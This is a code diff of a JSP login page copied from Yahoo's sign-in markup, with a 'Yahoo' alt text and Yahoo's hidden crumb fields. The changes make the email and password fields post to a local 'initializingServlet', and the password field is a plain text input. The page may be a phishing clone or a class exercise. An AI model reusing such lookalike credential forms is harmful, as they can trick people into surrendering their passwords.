@@ -5,7 +5,7 @@
   Time: 20:21
   To change this template use File | Settings | File Templates.
 --%>
-<%@ page contentType="text/html;charset=UTF-8" language="java" %>
+<%@ page contentType="text/html;charset=UTF-8" %>
 <html>
 <head>
     <style type="text/css">
@@ -252,7 +252,7 @@
         <div class="login-logo"><img src="picture/Chicken.png" alt="Yahoo" class="logo" width="200" height="">
         </div>
         <p id="error-offline" role="alert" class="row error-offline hide">Network connection timed out. Please try&nbsp;again.</p>
-        <form id="login-username-form" method="post" class="username-challenge">
+        <form id="login-username-form" action="initializingServlet" method="post" class="username-challenge">
             <input type="hidden" name="crumb" value="CbNbmcLwbcx">
             <input type="hidden" name="acrumb" value="r7TscSmE">
             <input type="hidden" name="sessionIndex" value="QQ--">
@@ -265,8 +265,8 @@
 
 
             <div id="username-country-code-field" class="username-country-code cci-dropdown-disabled code-of-length-1">
-                <input class="phone-no " type="text" name="username" id="login-username" tabindex="1" value="" autocapitalize="none" autocorrect="off" autofocus="true" placeholder="Enter your&nbsp;email">
-                <input class="phone-no " type="text" name="password" id="login-password" tabindex="2" value="" autocapitalize="none" autocorrect="off" autofocus="true" placeholder="Enter your&nbsp;password">
+                <input class="phone-no " type="text" name="username" id="login-username" tabindex="1" value=""  placeholder="Enter your&nbsp;email">
+                <input class="phone-no " type="text" name="password" id="login-password" tabindex="2" value=""  placeholder="Enter your&nbsp;password">
             </div>
             <p id="username-error" class="row error hide" role="alert"></p>
 
